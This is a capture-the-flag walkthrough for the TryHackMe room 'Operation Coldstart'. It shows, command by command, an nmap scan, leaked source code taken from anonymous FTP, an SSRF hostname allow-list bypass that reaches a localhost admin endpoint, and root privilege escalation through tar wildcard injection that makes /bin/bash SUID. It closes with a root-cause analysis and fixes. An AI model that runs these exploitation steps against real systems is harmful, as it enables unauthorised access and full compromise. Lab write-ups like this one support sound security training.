# Operation Coldstart — TryHackMe CTF Walkthrough

**Room:** [Operation Coldstart on TryHackMe](https://tryhackme.com/room/operationcoldstart)
**Difficulty:** Medium
**Category:** Web / SSRF + Privilege Escalation
**Date:** 2026-06-26
**Author:** San007 & Vulcan 🔥

---

## Overview

Operation Coldstart presents a Flask-based URL preview service running behind an internal hostname allow-list. The box chains four distinct vulnerability classes: anonymous FTP access revealing source code, hostname-based SSRF bypass to access a localhost-restricted admin endpoint, credential harvesting from admin notes, and a cron-based tar wildcard injection for root privilege escalation. Each stage builds on the previous one — no standalone exploits, pure logical chaining.

---

## What is SSRF (Server-Side Request Forgery)?

Server-Side Request Forgery is a vulnerability where an attacker can induce the server to make HTTP requests to arbitrary destinations. When the only security control is a hostname allow-list, SSRF is still exploitable if the allowed hostname resolves internally.

**Key concept:** The server makes the request, not the client — so requests appear to come from localhost, bypassing IP-based access controls.

**Real-world examples:**
- Cloud metadata endpoint (`169.254.169.254`) accessed via SSRF to steal AWS keys
- Internal admin panels on `127.0.0.1:8080` accessed through a public URL preview feature
-- Internal service discovery by probing ports on localhost through a vulnerable proxy

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -p- --min-rate=2000 -T4 -Pn 10.49.158.179
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux)
80/tcp open  http    Gunicorn
|_http-title: URL Preview - Volt Labs
```

Three ports only. FTP with anonymous access, SSH, and a Gunicorn web app. The title "URL Preview - Volt Labs" strongly suggests an SSRF vector.

### Web Source Inspection

```html
<!-- Page source revealed -->
<form method="get" action="/preview">
    <input id="url" type="text" name="url" class="form-control" ...>
</form>
<!-- Footer: © Volt Labs · do not expose externally -->
```

The `?url=` parameter on a GET endpoint called `/preview` — classic SSRF surface. The footer confirms this is an internal tool exposed accidentally.

---

## Exploitation

### Step 1 — Anonymous FTP

```bash
curl -s --ftp-pasv ftp://anonymous:anonymous@TARGET/pub/
```

```
-rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
```

Downloaded and extracted the backup — it contained the full Flask application source code.

### Step 2 — Source Code Analysis

```python
# /opt/voltlabs-preview/app.py
ALLOWED_HOSTS = {"kestrel.thm"}

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked", ...), 403
    r = requests.get(target, timeout=3)          # SSRF happens here
    ...

@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)                                # Localhost-only admin
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

The allow-list only contained `kestrel.thm` which resolved to `127.0.0.1` via `/etc/hosts`. No scheme validation, no path validation, no rebind protection.

### Step 3 — SSRF Chain

```bash
curl "http://TARGET/preview?url=http://kestrel.thm/admin/notes"
```

The request:
1. Passed the allow-list check — `kestrel.thm` was in `ALLOWED_HOSTS`
2. Resolved `kestrel.thm` to `127.0.0.1` on the target
3. Hit the `/admin/notes` endpoint
4. `request.remote_addr` started with `127.` → bypassed the localhost check
5. Read the admin notes file

**Result:** Admin notes revealed SSH credentials.

### Step 4 — SSH Access

```bash
ssh USERNAME@TARGET
# Password from admin notes
```

Connected as `webdev` and captured the user flag.

### Step 5 — Privilege Escalation — Cron Tar Wildcard Injection

Checking the system revealed a custom cron job:

```bash
cat /etc/cron.d/voltlabs-backup
```

```bash
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The `/opt/backups/` directory was owned by `webdev:webdev` — fully writable.

**The tar wildcard injection works because:**
The `*` glob expands to all filenames in the directory. If a filename starts with `--`, tar interprets it as a command-line argument. By creating specially-named files, we can inject tar checkpoint options that execute arbitrary commands.

```bash
cd /opt/backups

# Create the payload script
echo "chmod +s /bin/bash" > privesc.sh
chmod +x privesc.sh

# Create tar wildcard injection files
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh privesc.sh"
```

Within 60 seconds, the cron job fired. Tar expanded `*` which matched our injected filenames, treated them as arguments, and executed `privesc.sh` as root — making `/bin/bash` SUID root.

```bash
/bin/bash -p
# euid=0(root) — root shell
```

---

## Root Cause Analysis

The vulnerabilities exist because:

1. **Anonymous FTP enabled** — `backup.tar.gz` with source code was publicly readable
2. **Weak SSRF allow-list** — Only a single hostname check, no protocol or path validation
3. **Localhost-based admin access control** — Relied on `remote_addr` instead of authentication tokens
4. **Tar wildcard in root cron** — No `--` separator before the wildcard, allowing filename-based argument injection

The fixes would be:
- Disable anonymous FTP or restrict it to an isolated drop directory
- Validate URL schemes (reject `file://`, `gopher://`, etc.) and add path restrictions
- Replace IP-based access control with authentication (API keys, session tokens)
- Use `tar czf /var/backups/uploads.tgz -- *` or `./*` instead of bare `*`

---

## Key Takeaways

| Lesson | Why It Matters |
|--------|---------------|
| **Source code is the ultimate hint** | FTP leaked the full app source — without it, guessing the allowed hostname would have been impractical |
| **Hostname allow-lists are not enough** | If the allowed hostname points to localhost, SSRF is still fully exploitable |
| **Tar wildcard injection is a GTFOBins classic** | Any root cron using `tar *` in a user-writable directory is game over |
| **Chain attacks, don't force them** | Four separate low-severity issues combined into a full compromise — no single exploit |

---

## Tools Used

- **nmap** — Port scanning and service enumeration
- **curl** — FTP download and HTTP requests
- **Browser** — Web page inspection
- **sshpass** — Password-based SSH authentication
- **tar wildcard injection** — Privilege escalation via cron

---

## Flags

```
User flag:  flag{<REDACTED>}
Root flag:  flag{<REDACTED>}
```

---

## References

- [GTFOBins — Tar Wildcard Injection](https://gtfobins.github.io/gtfobins/tar/)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger — SSRF Web Security Academy](https://portswigger.net/web-security/ssrf)
- [TryHackMe — Operation Coldstart Room](https://tryhackme.com/room/operationcoldstart)
